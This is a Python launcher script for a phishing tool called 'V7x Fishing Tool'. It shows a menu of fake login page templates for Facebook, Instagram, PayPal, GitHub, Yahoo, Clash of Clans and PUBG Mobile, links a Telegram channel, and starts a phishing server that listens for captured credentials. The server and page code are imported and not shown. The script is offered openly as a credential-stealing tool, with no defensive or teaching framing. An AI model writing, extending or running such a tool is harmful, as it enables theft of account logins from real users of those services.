#!/usr/bin/python
#########################7x
import time, os, threading
from tools.Fishing.server import Fishing, db_File
from V7xStyle import Animation as A , G ,Text
from V7xStyle import Style
#########################7x
class App:
    @property
    def user(self):
        ######7x
        print ("\033[1;31m _______ _________ _______          _________ _        _______")
        print ("\033[1;31m(  ____ \\\\__   __/(  ____ \\|\\     /|\\__   __/( (    /|(  ____ \\")
        print ("\033[0;31m| (    \\/   ) (   | (    \\/| )   ( |   ) (   |  \\ (  || (    \\/")
        print ("\033[0;32m| (__       | |   | (_____ | (___) |   | |   |   \\ | || |")
        print ("\033[1;33m|  __)      | |   (_____  )|  ___  |   | |   | (\\ \\) || | ____")
        print ("\033[0;32m| (         | |         ) || (   ) |   | |   | | \\   || | \\_  ) ")
        print ("\033[1;31m| )      ___) (___/\\____) || )   ( |___) (___| )  \\  || (___) |")
        print ("\033[1;31m|/       \\_______/\\_______)|/     \\|\\_______/|/    )_)(_______)")
        print (" ")
        print ("\033[1;32m  V7x Fishing Tool  \033[1;36m  * _ *  \033[1;32m  Version: \033[1;31m2   \033[1;32m Date: \033[1;31m10-3-2020            ")
        print ("        ")
        SA = ['R#[G#1R#] C#FaceBook Accounts','R#[G#2R#] C#Instagram Accounts','R#[G#3R#] C#Paypal Accounts','R#[G#4R#] C#Github Accounts','R#[G#5R#] C#Yahoo Accounts','R#[G#6R#] C#Clash Of Clans Accounts','R#[G#7R#] C#PUBG Mobile Accounts','C#Available SoOoN..!'] 
        S = Style(*SA).Square(cols=2,padding_x=1,padding_y=1)
        print(S)
        ######7x
        print ("\033[1;36mTelegram >> \033[1;33mhttps://t.me/Arab_heroes ")
        text = Text('B#[C#*B#] Enter Number C#:W# ')
        page = input(text)
        try:
            page = int(page)
            templates = {
            1:'Facebook',
            2:'Instagram',
            3:'Paypal',
            4:'Github',
            5:'Yahoo',
            6:'Clash',
            7:'Pubg'
            }
            return templates[page]
        except:
            print('Command Not found!')
            return False

    def run(self,page):
        if page:
            try:
                F = Fishing(os.getcwd())
                F.start(page)
                F.listening(db_File)
                A.Loading(text=G+'[*] Server is Running...',repeat=99999)
            except KeyboardInterrupt:
                exit('\rGood bye :D'+' '*20)

if __name__ == '__main__':
    app = App()
    page = app.user
    app.run(page)
